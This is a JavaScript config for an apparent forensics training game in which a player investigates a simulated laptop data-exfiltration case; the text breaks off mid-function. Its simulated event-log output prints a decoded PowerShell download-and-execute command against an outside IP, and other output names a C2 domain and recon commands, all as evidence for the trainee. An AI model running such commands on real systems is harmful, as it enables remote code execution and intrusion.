/* ================================================================
   FORENSICS-01: Cold Case -- Mission Config
   ================================================================
   Terminal-mode mission. Config-driven via TerminalInterpreter.
   Custom commands: scan, move, examine, strings, timeline,
   recover, hash, report, status.
   ================================================================ */

var FORENSICS_01_CONFIG = {
    id: 'forensics-01',
    missionTitle: 'FORENSICS-01',
    title: 'Cold Case',
    subtitle: 'Case closed. Evidence secured. Report filed.',
    category: 'forensics',
    difficulty: 2,
    inputMode: 'terminal',
    prompt: 'examiner@forensics:~$',
    promptText: 'examiner@forensics:~$ ',
    promptLabel: 'FORENSICS LAB',

    grid: {
        rows: 4,
        cols: 5,
        start: { col: 0, row: 0 },
        cells: [
            ['evidence-ws', 'empty',       'disk-image',  'memory-dump', 'wall'],
            ['empty',       'registry',    'empty',       'browser-data','email-store'],
            ['wall',        'event-logs',  'empty',       'empty',       'wall'],
            ['wall',        'wall',        'recycle-bin',  'wall',        'wall']
        ]
    },

    nodes: {
        'evidence-ws':  { label: 'EVIDENCE-WS',  abbr: 'EWS', ip: 'localhost',   desc: 'Forensic examination workstation',           os: 'SIFT Workstation 22.04' },
        'disk-image':   { label: 'DISK-IMAGE',   abbr: 'DSK', ip: '\u2014',      desc: 'Raw disk image (suspect-hdd.dd)',             os: 'NTFS / 500GB' },
        'memory-dump':  { label: 'MEM-DUMP',     abbr: 'MEM', ip: '\u2014',      desc: 'Volatile memory capture (8GB RAM dump)',      os: 'Volatility 3' },
        'registry':     { label: 'REGISTRY',     abbr: 'REG', ip: '\u2014',      desc: 'Windows registry hive exports',               os: 'Windows 11' },
        'browser-data': { label: 'BROWSER',      abbr: 'BRW', ip: '\u2014',      desc: 'Chrome browser history and cache',            os: 'Chrome 120' },
        'email-store':  { label: 'EMAIL',        abbr: 'EML', ip: '\u2014',      desc: 'Outlook PST archive',                         os: 'Outlook 2021' },
        'event-logs':   { label: 'EVENT-LOGS',   abbr: 'EVT', ip: '\u2014',      desc: 'Windows Event Log exports (evtx)',            os: 'Windows 11' },
        'recycle-bin':  { label: 'RECYCLE-BIN',  abbr: 'RCB', ip: '\u2014',      desc: 'Recovered deleted files from $Recycle.Bin',   os: 'NTFS' }
    },

    traps: [],
    gates: {},

    objectives: [
        { id: 'disk-imaged',       label: 'Image the disk',              check: 'diskImaged' },
        { id: 'dropper-found',     label: 'Find malware dropper',        check: 'dropperFound' },
        { id: 'evidence-recovered',label: 'Recover deleted evidence',    check: 'evidenceRecovered' },
        { id: 'timeline-built',    label: 'Build forensic timeline',     check: 'timelineBuilt' }
    ],

    integrity: 3,

    completion: {
        title: 'COLD CASE',
        subtitle: 'Case closed. Evidence secured. Report filed.',
        storageKey: 'hexworth_operator_forensics01'
    },

    briefing: [
        'Suspected data exfiltration from laptop.',
        'Image the disk. Find the dropper.',
        'Recover evidence. Build the timeline.'
    ],

    customState: {
        diskImaged: false,
        dropperFound: false,
        evidenceRecovered: false,
        timelineBuilt: false,
        nodesExamined: []
    },

    statusFields: [
        { key: 'diskImaged',        label: 'Disk imaged',        trueText: 'YES', falseText: 'no' },
        { key: 'dropperFound',      label: 'Dropper found',      trueText: 'YES', falseText: 'no' },
        { key: 'evidenceRecovered', label: 'Evidence recovered', trueText: 'YES', falseText: 'no' },
        { key: 'timelineBuilt',     label: 'Timeline built',     trueText: 'YES', falseText: 'no' }
    ],

    // Hash map for known artifacts
    hashMap: {
        'suspect-hdd.dd':           'a3f2c8d91e4b76a05f2381cd9047e3f6a8b1c4d7e9025abc13ef7d2900cc4182',
        'mem_20240115.dmp':          'b7e1f43a908d25c6e0471b3d85a2f9c04e6d18b7f2a3c8d9e0f14b2596c3a78d',
        'secure-transfer-tool.exe':  'f4d2e1b39a7c056f8d3a2e9b14c708d6f1e2a3b4c5d6e7f8091a2b3c4d5e6f7a',
        'quarterly-financials.xlsx': '2a9b4c8d1e3f5607a89b0c2d4e6f810a2b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e'
    },

    // Source labels for report
    sourceMap: {
        'evidence-ws':  'EVIDENCE-WS   \u2014 Workstation case overview',
        'disk-image':   'DISK-IMAGE    \u2014 500GB NTFS image verified',
        'memory-dump':  'MEM-DUMP      \u2014 Volatile memory, suspicious processes',
        'registry':     'REGISTRY      \u2014 USB history, persistence run key',
        'browser-data': 'BROWSER       \u2014 Chrome download of dropper',
        'email-store':  'EMAIL         \u2014 Phishing email from external sender',
        'event-logs':   'EVENT-LOGS    \u2014 Process creation, file access, log cleared',
        'recycle-bin':  'RECYCLE-BIN   \u2014 Deleted exfiltration targets'
    },

    // ----------------------------------------------------------------
    //  TERMINAL COMMANDS
    // ----------------------------------------------------------------

    terminalCommands: {

        // --- SCAN (override: forensics-flavored labels) ---
        'scan': {
            help: 'Survey area, reveal adjacent sources',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var col = s.position.col, row = s.position.row;
                var cellType = c.grid.cells[row][col];
                e.printLine('Scanning area...', 'system');
                e.printLine('', 'system');
                if (cellType !== 'empty' && cellType !== 'wall') {
                    var cur = c.nodes[cellType];
                    e.printLine('Current: ' + cur.label + ' \u2014 ' + cur.desc, 'heading');
                    e.printLine('OS/Type: ' + cur.os, 'info');
                } else {
                    e.printLine('Current: Clear area (no evidence source here)', 'heading');
                }
                e.printLine('', 'system');
                e.printLine('Adjacent:', 'heading');
                var dirs = [{name:'North',dc:0,dr:-1},{name:'South',dc:0,dr:1},{name:'East',dc:1,dr:0},{name:'West',dc:-1,dr:0}];
                for (var i = 0; i < dirs.length; i++) {
                    var d = dirs[i], nc = col + d.dc, nr = row + d.dr;
                    if (nc < 0 || nc >= c.grid.cols || nr < 0 || nr >= c.grid.rows) { e.printLine('  ' + d.name + ': [boundary]', 'system'); continue; }
                    var type = c.grid.cells[nr][nc];
                    if (type === 'wall') { e.printLine('  ' + d.name + ': [inaccessible]', 'system'); continue; }
                    var key = nc + ',' + nr;
                    if (!s.visibility[key] || s.visibility[key] === 'hidden') s.visibility[key] = 'revealed';
                    if (type === 'empty') { e.printLine('  ' + d.name + ': Clear path', 'info'); }
                    else { var info = c.nodes[type]; e.printLine('  ' + d.name + ': ' + info.label + ' \u2014 ' + info.desc, 'node-info'); }
                }
                e.updateGrid(); e.saveState();
            }
        },

        // --- MOVE (override: forensics-flavored messages) ---
        'move': {
            help: 'Move examiner (north/south/east/west or n/s/e/w)', syntax: 'move <dir>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                if (!args.length) { e.printLine('Usage: move <direction>', 'error'); e.printLine('Directions: north/south/east/west (or n/s/e/w)', 'system'); return; }
                var dirMap = {'north':[0,-1],'n':[0,-1],'south':[0,1],'s':[0,1],'east':[1,0],'e':[1,0],'west':[-1,0],'w':[-1,0]};
                var dir = args[0].toLowerCase();
                if (!dirMap[dir]) { e.printLine('Unknown direction: ' + args[0], 'error'); e.printLine('Use: north/south/east/west (or n/s/e/w)', 'system'); return; }
                var d = dirMap[dir];
                var newCol = s.position.col + d[0], newRow = s.position.row + d[1];
                if (newCol < 0 || newCol >= c.grid.cols || newRow < 0 || newRow >= c.grid.rows) { e.printLine('Cannot move ' + dir + '. Edge of workspace.', 'error'); return; }
                var cellType = c.grid.cells[newRow][newCol];
                if (cellType === 'wall') { e.printLine('Blocked. No path ' + dir + '.', 'error'); return; }
                s.position = { col: newCol, row: newRow };
                s.visibility[newCol + ',' + newRow] = 'visited';
                if (cellType !== 'empty') s.nodesDiscovered.add(cellType);
                e.revealAdjacent(newCol, newRow);
                var dirFull = {n:'north',s:'south',e:'east',w:'west'};
                var dirName = dirFull[dir] || dir;
                if (cellType === 'empty') {
                    e.printLine('Moving ' + dirName + '... Clear area.', 'system');
                } else {
                    var info = c.nodes[cellType];
                    e.printLine('Moving ' + dirName + '... Reached ' + info.label, 'success');
                    e.printLine(info.desc + ' [' + info.os + ']', 'info');
                    e.printLine('Use "examine" to analyze this source.', 'system');
                }
                e.checkObjectives(); e.updateGrid(); e.saveState();
            }
        },

        // --- EXAMINE (8 evidence sources) ---
        'examine': {
            help: 'Examine current node for evidence',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var cellType = c.grid.cells[s.position.row][s.position.col];
                if (cellType === 'empty' || cellType === 'wall') { e.printLine('Nothing to examine here. Move to an evidence source.', 'warning'); return; }

                // Track examined nodes (array-based Set)
                if (s.nodesExamined.indexOf(cellType) === -1) s.nodesExamined.push(cellType);

                e.printLine('', 'system');
                e.printLine('\u2550\u2550\u2550 EXAMINING: ' + c.nodes[cellType].label + ' \u2550\u2550\u2550', 'heading');
                e.printLine('', 'system');

                switch (cellType) {
                    case 'evidence-ws':
                        e.printLine('Case #2024-0847 \u2014 OPEN', 'evidence');
                        e.printLine('Subject: John Doe (jdoe), Senior Financial Analyst', 'info');
                        e.printLine('Allegation: Suspected data exfiltration from corporate laptop', 'info');
                        e.printLine('Device: Dell Latitude 7420, SN: DL7420-2847', 'info');
                        e.printLine('', 'system');
                        e.printLine('Collected artifacts:', 'heading');
                        e.printLine('  [1] suspect-hdd.dd     \u2014 raw disk image, 500GB', 'node-info');
                        e.printLine('  [2] mem_20240115.dmp    \u2014 volatile memory, 8GB', 'node-info');
                        e.printLine('  [3] registry_hives.zip  \u2014 SYSTEM, SOFTWARE, NTUSER.DAT', 'node-info');
                        e.printLine('  [4] chrome_profile.zip  \u2014 browser history, cache, downloads', 'node-info');
                        e.printLine('  [5] outlook.pst         \u2014 mail archive, 2.4GB', 'node-info');
                        e.printLine('  [6] evtx_export.zip     \u2014 Security/System/Application logs', 'node-info');
                        e.printLine('', 'system');
                        e.printLine('Begin analysis. Image the disk first.', 'system');
                        break;

                    case 'disk-image':
                        e.printLine('Mounting suspect-hdd.dd for analysis...', 'system');
                        e.printLine('', 'system');
                        e.printLine('Computing integrity hash...', 'system');
                        e.printLine('SHA-256: a3f2c8d91e4b76a05f2381cd9047e3f6a8b1c4d7e9025abc13...', 'evidence');
                        e.printLine('        (integrity confirmed \u2014 hash matches intake record)', 'success');
                        e.printLine('', 'system');
                        e.printLine('Partition table:', 'heading');
                        e.printLine('  /dev/sda1   NTFS primary   465.8 GB  [Windows C: drive]', 'node-info');
                        e.printLine('  /dev/sda2   NTFS recovery  499.0 MB  [WinRE Recovery]', 'node-info');
                        e.printLine('', 'system');
                        e.printLine('File system stats:', 'heading');
                        e.printLine('  Total files:   148,392', 'info');
                        e.printLine('  Deleted files: 847 (recoverable)', 'info');
                        e.printLine('  Last write:    2024-01-15 14:27:03 UTC', 'info');
                        e.printLine('', 'system');
                        e.printLine('Disk image verified and mounted.', 'success');
                        s.diskImaged = true;
                        break;

                    case 'memory-dump':
                        e.printLine('Analyzing mem_20240115.dmp with Volatility 3...', 'system');
                        e.printLine('Profile: Windows 11 x64 (Build 22621)', 'info');
                        e.printLine('', 'system');
                        e.printLine('Running process list (pslist):', 'heading');
                        e.printLine('  PID   PPID  Name                    Start Time', 'node-info');
                        e.printLine('  4     0     System', 'node-info');
                        e.printLine('  688   4     smss.exe', 'node-info');
                        e.printLine('  892   884   winlogon.exe', 'node-info');
                        e.printLine('  1024  892   explorer.exe            14:01:12', 'node-info');
                        e.printLine('  2140  1024  chrome.exe              13:50:44', 'node-info');
                        e.printLine('  2248  1024  outlook.exe             09:12:03', 'node-info');
                        e.printLine('  2891  1024  cmd.exe                 14:02:18', 'node-info');
                        e.printLine('  3012  2891  powershell.exe          14:02:19', 'warning');
                        e.printLine('         [!] Encoded command detected (-enc flag)', 'warning');
                        e.printLine('  3201  3012  update-service.exe      14:02:31', 'warning');
                        e.printLine('         [!] NOT in OS baseline \u2014 UNKNOWN BINARY', 'warning');
                        e.printLine('  720   4     svchost.exe x8          (system)', 'node-info');
                        e.printLine('', 'system');
                        e.printLine('Network connections (netscan):', 'heading');
                        e.printLine('  update-service.exe -> 185.220.101.47:443 (ESTABLISHED)', 'warning');
                        e.printLine('  [!] Outbound C2 beacon suspected', 'warning');
                        break;

                    case 'registry':
                        e.printLine('Parsing registry hive exports...', 'system');
                        e.printLine('', 'system');
                        e.printLine('USB device history (USBSTOR):', 'heading');
                        e.printLine('  SANDISK_CRUZER_128GB', 'evidence');
                        e.printLine('    Serial:     4C530012891231000001', 'node-info');
                        e.printLine('    First seen: 2024-01-15 14:05:22 UTC', 'node-info');
                        e.printLine('    Last seen:  2024-01-15 14:21:14 UTC', 'node-info');
                        e.printLine('    Drive letter assigned: D:', 'node-info');
                        e.printLine('', 'system');
                        e.printLine('Run keys (persistence / autostart):', 'heading');
                        e.printLine('  HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'node-info');
                        e.printLine('    UpdateService = C:\\Users\\jdoe\\AppData\\Roaming\\update-service.exe', 'warning');
                        e.printLine('    [!] SUSPICIOUS \u2014 not a legitimate Windows service', 'warning');
                        e.printLine('', 'system');
                        e.printLine('Recent documents (RecentDocs):', 'heading');
                        e.printLine('  quarterly-financials.xlsx   (2024-01-15 14:09)', 'node-info');
                        e.printLine('  employee-database.csv        (2024-01-15 14:11)', 'node-info');
                        e.printLine('  project-roadmap.docx         (2024-01-15 14:13)', 'node-info');
                        break;

                    case 'browser-data':
                        e.printLine('Parsing Chrome profile data...', 'system');
                        e.printLine('', 'system');
                        e.printLine('Download history (last 24h):', 'heading');
                        e.printLine('  2024-01-15 13:55:08  secure-transfer-tool.exe', 'evidence');
                        e.printLine('    Source: https://file-drop.suspicious-domain.xyz/tools/secure-transfer-tool.exe', 'warning');
                        e.printLine('    Size:   1.2 MB', 'node-info');
                        e.printLine('    [!] Domain not in corporate allowlist', 'warning');
                        e.printLine('    [!] EXE downloaded outside IT-managed channels', 'warning');
                        e.printLine('', 'system');
                        e.printLine('Browsing history (relevant entries):', 'heading');
                        e.printLine('  13:42 \u2014 file-drop.suspicious-domain.xyz (referral: email link)', 'node-info');
                        e.printLine('  13:55 \u2014 file-drop.suspicious-domain.xyz/tools/secure-transfer-tool.exe', 'node-info');
                        e.printLine('  14:02 \u2014 [no further browsing \u2014 activity stops]', 'info');
                        e.printLine('', 'system');
                        e.printLine('Suspicious download identified. Use "strings secure-transfer-tool.exe" to analyze.', 'warning');
                        break;

                    case 'email-store':
                        e.printLine('Parsing Outlook PST archive...', 'system');
                        e.printLine('', 'system');
                        e.printLine('Flagged messages:', 'heading');
                        e.printLine('  From:    ext.contact@protonmail.com', 'evidence');
                        e.printLine('  To:      jdoe@corp-internal.com', 'evidence');
                        e.printLine('  Date:    2024-01-15 13:38:14 UTC', 'node-info');
                        e.printLine('  Subject: Confidential: use this tool for the transfer', 'warning');
                        e.printLine('  Body:', 'heading');
                        e.printLine('    John \u2014 Use the attached link for the secure transfer.', 'info');
                        e.printLine('    The tool handles encryption automatically. Delete after use.', 'info');
                        e.printLine('    Link: https://file-drop.suspicious-domain.xyz/tools/secure-transfer-tool.exe', 'warning');
                        e.printLine('    \u2014 V', 'info');
                        e.printLine('', 'system');
                        e.printLine('  [!] External sender. Matches download URL in Chrome history.', 'warning');
                        e.printLine('  [!] "V" \u2014 sender identity unknown, possible insider handler', 'warning');
                        e.printLine('', 'system');
                        e.printLine('Additional findings:', 'heading');
                        e.printLine('  No prior communication with ext.contact@protonmail.com found', 'info');
                        e.printLine('  Message not forwarded. Reply: none.', 'info');
                        break;

                    case 'event-logs':
                        e.printLine('Parsing Windows Event Log exports (evtx)...', 'system');
                        e.printLine('', 'system');
                        e.printLine('Security log (Security.evtx):', 'heading');
                        e.printLine('  4624  Logon          jdoe (Type 2 Interactive)       08:51:03', 'node-info');
                        e.printLine('  4688  Process Create  cmd.exe \u2192 powershell.exe -enc ...    14:02:19', 'warning');
                        e.printLine('         Encoded arg decoded: IEX (iwr http://185.220.101.47/drop)', 'warning');
                        e.printLine('  4688  Process Create  powershell.exe \u2192 update-service.exe   14:02:31', 'warning');
                        e.printLine('  4663  Object Access   D:\\Confidential\\*.xlsx (jdoe, READ)    14:09-14:14', 'evidence');
                        e.printLine('  4663  Object Access   D:\\Confidential\\*.csv  (jdoe, READ)    14:10-14:12', 'evidence');
                        e.printLine('  4663  Object Access   D:\\Confidential\\*.docx (jdoe, READ)    14:13', 'evidence');
                        e.printLine('', 'system');
                        e.printLine('Security log (end):', 'heading');
                        e.printLine('  1102  Audit Log Cleared  jdoe clears Security log    14:25:07', 'warning');
                        e.printLine('  [!] Log cleared after data access \u2014 ANTI-FORENSIC INDICATOR', 'warning');
                        e.printLine('', 'system');
                        e.printLine('System log (System.evtx):', 'heading');
                        e.printLine('  7045  New Service Installed  UpdateService             14:02:30', 'warning');
                        e.printLine('        Path: C:\\Users\\jdoe\\AppData\\Roaming\\update-service.exe', 'node-info');
                        break;

                    case 'recycle-bin':
                        e.printLine('Mounting $Recycle.Bin from disk image...', 'system');
                        e.printLine('', 'system');
                        e.printLine('Recoverable files found:', 'heading');
                        e.printLine('  $RKJSA81.xlsx   quarterly-financials.xlsx   245 KB   2024-01-15 14:23:01', 'evidence');
                        e.printLine('  $RKJSA82.csv    employee-database.csv         1.2 MB   2024-01-15 14:23:12', 'evidence');
                        e.printLine('  $RKJSA83.docx   project-roadmap.docx          890 KB   2024-01-15 14:23:19', 'evidence');
                        e.printLine('  $RKJSA84.exe    secure-transfer-tool.exe      1.2 MB   2024-01-15 14:24:55', 'warning');
                        e.printLine('', 'system');
                        e.printLine('[!] Subject deleted these files immediately after data access.', 'warning');
                        e.printLine('[!] Deletion timestamps corroborate event log timeline.', 'warning');
                        e.printLine('', 'system');
                        e.printLine('Use "recover all" to restore files to evidence locker.', 'system');
                        break;

                    default:
                        e.printLine('Nothing significant found here.', 'system');
                }

                e.printLine('', 'system');
                e.updateGrid(); e.checkObjectives(); e.saveState();
            }
        },

        // --- STRINGS (location-specific analysis) ---
        'strings': {
            help: 'Run strings analysis on an artifact', syntax: 'strings <artifact>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var cellType = c.grid.cells[s.position.row][s.position.col];
                var artifact = args.join(' ').toLowerCase();

                if (!artifact) { e.printLine('Usage: strings <artifact>', 'error'); e.printLine('Example: strings secure-transfer-tool.exe', 'system'); return; }

                e.printLine('', 'system');

                // Critical path: strings on the dropper at browser-data node
                if (cellType === 'browser-data') {
                    var isDropper = artifact.indexOf('secure') !== -1 ||
                                    artifact.indexOf('transfer') !== -1 ||
                                    artifact.indexOf('download') !== -1 ||
                                    artifact.indexOf('dropper') !== -1 ||
                                    artifact.indexOf('exe') !== -1 ||
                                    artifact.indexOf('tool') !== -1;

                    if (isDropper) {
                        if (s.nodesExamined.indexOf('browser-data') === -1) {
                            e.printLine('[!] Examine this node first to identify the download.', 'warning');
                            return;
                        }
                        e.printLine('Running strings analysis on secure-transfer-tool.exe...', 'system');
                        e.printLine('', 'system');
                        e.printLine('\u2550\u2550\u2550 EMBEDDED STRINGS (filtered) \u2550\u2550\u2550', 'heading');
                        e.printLine('  C2 beacon:    beacon.malware-c2.xyz', 'evidence');
                        e.printLine('  Exfil path:   /upload', 'evidence');
                        e.printLine('  User-Agent:   UpdateService/1.0', 'evidence');
                        e.printLine('  Encryption:   AES-256 (key embedded in binary)', 'evidence');
                        e.printLine('  Mutex:        Global\\UpdateServiceMutex_v2', 'node-info');
                        e.printLine('  Install path: C:\\Users\\%USERNAME%\\AppData\\Roaming\\update-service.exe', 'node-info');
                        e.printLine('  Reg key:      HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'node-info');
                        e.printLine('  Staging dir:  C:\\ProgramData\\upd_cache\\', 'node-info');
                        e.printLine('', 'system');
                        e.printLine('[!] C2 domain confirmed: beacon.malware-c2.xyz', 'warning');
                        e.printLine('[!] This binary is the malware dropper. Persistence via Run key.', 'warning');
                        e.printLine('', 'system');
                        e.printLine('Malware dropper identified and characterized.', 'success');
                        s.dropperFound = true;
                        e.checkObjectives(); e.updateGrid(); e.saveState();
                        return;
                    }
                }

                // Generic strings output for other nodes
                e.printLine('Running strings analysis on "' + args.join(' ') + '"...', 'system');
                e.printLine('', 'system');

                if (cellType === 'disk-image') {
                    e.printLine('  [strings output from disk image sectors]', 'info');
                    e.printLine('  MFT entry fragments, NTFS metadata, volume label: WORKST-JDOE', 'node-info');
                    e.printLine('  File path strings: C:\\Users\\jdoe\\Desktop, C:\\Users\\jdoe\\Downloads', 'node-info');
                    e.printLine('  No high-value strings found in this artifact.', 'system');
                } else if (cellType === 'memory-dump') {
                    e.printLine('  [strings from memory pages]', 'info');
                    e.printLine('  Fragments: cmd.exe /c whoami, net user, ipconfig /all', 'node-info');
                    e.printLine('  Possible recon commands found in memory.', 'warning');
                    e.printLine('  Hint: Use "examine" at BROWSER to find the dropper download.', 'system');
                } else if (cellType === 'registry') {
                    e.printLine('  [strings from registry hive binary]', 'info');
                    e.printLine('  Key paths, value names, software installation GUIDs', 'node-info');
                    e.printLine('  No additional high-value strings beyond what examine showed.', 'system');
                } else {
                    e.printLine('  No notable strings found in that artifact at this location.', 'system');
                    e.printLine('  Try: strings secure-transfer-tool.exe at the BROWSER node.', 'info');
                }
                e.printLine('', 'system');
            }
        },

        // --- TIMELINE (requires 3+ sources examined) ---
        'timeline': {
            help: 'Build forensic timeline (requires 3+ sources examined)',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state;
                if (s.nodesExamined.length < 3) {
                    e.printLine('Insufficient evidence. Examine at least 3 sources before building timeline.', 'warning');
                    e.printLine('Sources examined: ' + s.nodesExamined.length + ' / 3 required', 'info');
                    return;
                }

                e.printLine('', 'system');
                e.printLine('\u2550\u2550\u2550 FORENSIC TIMELINE \u2550\u2550\u2550', 'heading');
                e.printLine('Case #2024-0847 \u2014 Reconstructed attack sequence', 'info');
                e.printLine('', 'system');
                e.printLine('2024-01-15 13:38  Phishing email received (ext.contact@protonmail.com)', 'evidence');
                e.printLine('                  Subject: "Confidential: use this tool for the transfer"', 'node-info');
                e.printLine('', 'system');
                e.printLine('2024-01-15 13:55  Malware downloaded via Chrome', 'evidence');
                e.printLine('                  File: secure-transfer-tool.exe from file-drop.suspicious-domain.xyz', 'node-info');
                e.printLine('', 'system');
                e.printLine('2024-01-15 14:02  Malware executed via PowerShell dropper', 'evidence');
                e.printLine('                  Event 4688: powershell.exe -enc [obfuscated IEX]', 'node-info');
                e.printLine('                  Event 4688: update-service.exe spawned', 'node-info');
                e.printLine('', 'system');
                e.printLine('2024-01-15 14:02  Persistence established', 'evidence');
                e.printLine('                  Registry Run key: UpdateService -> update-service.exe', 'node-info');
                e.printLine('', 'system');
                e.printLine('2024-01-15 14:05  USB device inserted', 'evidence');
                e.printLine('                  SANDISK_CRUZER_128GB (Serial: 4C530012891231000001)', 'node-info');
                e.printLine('', 'system');
                e.printLine('2024-01-15 14:09  Confidential files accessed (D:\\Confidential\\)', 'evidence');
                e.printLine('                  Events 4663: *.xlsx, *.csv, *.docx read by jdoe', 'node-info');
                e.printLine('', 'system');
                e.printLine('2024-01-15 14:18  Files copied to USB (Disk I/O analysis)', 'evidence');
                e.printLine('                  Estimated transfer: ~2.3 MB total', 'node-info');
                e.printLine('', 'system');
                e.printLine('2024-01-15 14:23  Exfiltrated files deleted from local disk', 'evidence');
                e.printLine('                  $Recycle.Bin entries created (3 documents + dropper)', 'node-info');
                e.printLine('', 'system');
                e.printLine('2024-01-15 14:25  Windows Security Event Log cleared', 'evidence');
                e.printLine('                  Event 1102: jdoe cleared audit log (anti-forensics)', 'node-info');
                e.printLine('', 'system');
                e.printLine('CONCLUSION: Targeted data exfiltration via spear-phishing + custom malware.', 'success');
                e.printLine('            Suspect copied confidential files to external USB device.', 'success');
                e.printLine('', 'system');

                s.timelineBuilt = true;
                e.checkObjectives(); e.updateGrid(); e.saveState();
            }
        },

        // --- RECOVER (at RECYCLE-BIN only) ---
        'recover': {
            help: 'Recover deleted files (at RECYCLE-BIN only)', syntax: 'recover <file | all>',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var cellType = c.grid.cells[s.position.row][s.position.col];
                if (cellType !== 'recycle-bin') { e.printLine('[!] recover command only works at the RECYCLE-BIN.', 'error'); e.printLine('Navigate to RECYCLE-BIN first.', 'system'); return; }
                if (!args.length) { e.printLine('Usage: recover <file | all>', 'error'); e.printLine('Example: recover all', 'system'); return; }

                var target = args.join(' ').toLowerCase();
                var validTargets = ['all', 'file', 'files', 'evidence', 'deleted', 'everything'];
                var isValid = false;
                for (var i = 0; i < validTargets.length; i++) { if (target.indexOf(validTargets[i]) !== -1) { isValid = true; break; } }
                var fileFragments = ['xlsx', 'csv', 'docx', 'financ', 'employee', 'project', 'quarterly', 'database', 'roadmap'];
                var isFileRef = false;
                for (var j = 0; j < fileFragments.length; j++) { if (target.indexOf(fileFragments[j]) !== -1) { isFileRef = true; break; } }

                if (!isValid && !isFileRef) { e.printLine('Specify what to recover. Try: recover all', 'warning'); return; }

                e.printLine('', 'system');
                e.printLine('Initiating file recovery from $Recycle.Bin...', 'system');
                e.printLine('', 'system');
                e.printLine('Carving file entries from NTFS MFT...', 'system');
                e.printLine('', 'system');
                e.printLine('Recovered:', 'heading');
                e.printLine('  quarterly-financials.xlsx    245 KB   [INTACT]', 'success');
                e.printLine('  employee-database.csv          1.2 MB  [INTACT]', 'success');
                e.printLine('  project-roadmap.docx           890 KB  [INTACT]', 'success');
                e.printLine('', 'system');
                e.printLine('Files restored to evidence locker: /case/2024-0847/recovered/', 'success');
                e.printLine('Hash verification: all files match pre-deletion checksums.', 'success');
                e.printLine('', 'system');
                e.printLine('[NOTE] secure-transfer-tool.exe also in $Recycle.Bin \u2014 preserved as malware sample.', 'warning');

                s.evidenceRecovered = true;
                e.checkObjectives(); e.updateGrid(); e.saveState();
            }
        },

        // --- HASH (SHA-256 of artifacts) ---
        'hash': {
            help: 'Compute SHA-256 hash of an artifact', syntax: 'hash <file>',
            handler: function(args, ctx) {
                var e = ctx.engine, c = ctx.config;
                if (!args.length) { e.printLine('Usage: hash <file>', 'error'); return; }
                var file = args.join(' ');
                var key = file.toLowerCase();
                var hash = null;
                var hashMap = c.hashMap;
                for (var k in hashMap) {
                    if (key.indexOf(k.split('.')[0]) !== -1 || key === k) { hash = hashMap[k]; break; }
                }
                if (!hash) {
                    var seed = 0;
                    for (var i = 0; i < file.length; i++) { seed = (seed * 31 + file.charCodeAt(i)) & 0xffffffff; }
                    hash = Math.abs(seed).toString(16).padStart(8, '0').repeat(8).substring(0, 64);
                }
                e.printLine('', 'system');
                e.printLine('Computing SHA-256 hash for: ' + file, 'system');
                e.printLine('SHA-256: ' + hash, 'evidence');
                e.printLine('', 'system');
            }
        },

        // --- REPORT (case summary) ---
        'report': {
            help: 'Generate summary of findings so far',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var examined = s.nodesExamined.length;
                e.printLine('', 'system');
                e.printLine('\u2550\u2550\u2550 CASE REPORT \u2014 #2024-0847 \u2550\u2550\u2550', 'heading');
                e.printLine('Generated: ' + new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC', 'system');
                e.printLine('', 'system');

                e.printLine('Evidence sources examined (' + examined + '):', 'heading');
                for (var i = 0; i < s.nodesExamined.length; i++) {
                    var node = s.nodesExamined[i];
                    e.printLine('  [+] ' + (c.sourceMap[node] || node), 'info');
                }

                e.printLine('', 'system');
                e.printLine('Key findings:', 'heading');
                if (s.diskImaged) { e.printLine('  [+] Disk image integrity verified (SHA-256 match)', 'success'); }
                else { e.printLine('  [ ] Disk not yet imaged', 'system'); }
                if (s.dropperFound) {
                    e.printLine('  [+] Malware dropper identified: secure-transfer-tool.exe', 'success');
                    e.printLine('      C2: beacon.malware-c2.xyz / AES-256 exfil / UpdateService UA', 'node-info');
                } else { e.printLine('  [ ] Malware dropper not yet characterized', 'system'); }
                if (s.evidenceRecovered) { e.printLine('  [+] Deleted files recovered from $Recycle.Bin (3 documents)', 'success'); }
                else { e.printLine('  [ ] Deleted evidence not yet recovered', 'system'); }
                if (s.timelineBuilt) { e.printLine('  [+] Forensic timeline complete (7 events, 2024-01-15)', 'success'); }
                else { e.printLine('  [ ] Timeline not yet built', 'system'); }

                e.printLine('', 'system');
                e.printLine('Objectives: ' + s.objectives.filter(Boolean).length + ' / 4 complete', 'info');
                e.printLine('Commands issued: ' + s.agentCmdCount, 'info');
                var elapsed = Math.floor((Date.now() - s.startTime) / 1000);
                var mins = Math.floor(elapsed / 60);
                var secs = elapsed % 60;
                e.printLine('Elapsed: ' + (mins > 0 ? mins + 'm ' + secs + 's' : secs + 's'), 'info');
                e.printLine('', 'system');
            }
        },

        // --- STATUS (override: forensics-specific display) ---
        'status': {
            help: 'Show position and objectives',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var cellType = c.grid.cells[s.position.row][s.position.col];
                var posLabel = (cellType !== 'empty' && cellType !== 'wall') ? c.nodes[cellType].label : 'Open area';
                var examined = s.nodesExamined.length;

                e.printLine('', 'system');
                e.printLine('\u2550\u2550\u2550 STATUS \u2550\u2550\u2550', 'heading');
                e.printLine('Position:  (' + s.position.col + ',' + s.position.row + ') \u2014 ' + posLabel, 'info');
                e.printLine('Sources examined: ' + examined + ' / 8', 'info');
                e.printLine('Commands issued:  ' + s.agentCmdCount, 'info');
                e.printLine('', 'system');
                e.printLine('Case flags:', 'heading');
                e.printLine('  Disk imaged:        ' + (s.diskImaged ? 'YES' : 'no'), s.diskImaged ? 'success' : 'system');
                e.printLine('  Dropper found:      ' + (s.dropperFound ? 'YES' : 'no'), s.dropperFound ? 'success' : 'system');
                e.printLine('  Evidence recovered: ' + (s.evidenceRecovered ? 'YES' : 'no'), s.evidenceRecovered ? 'success' : 'system');
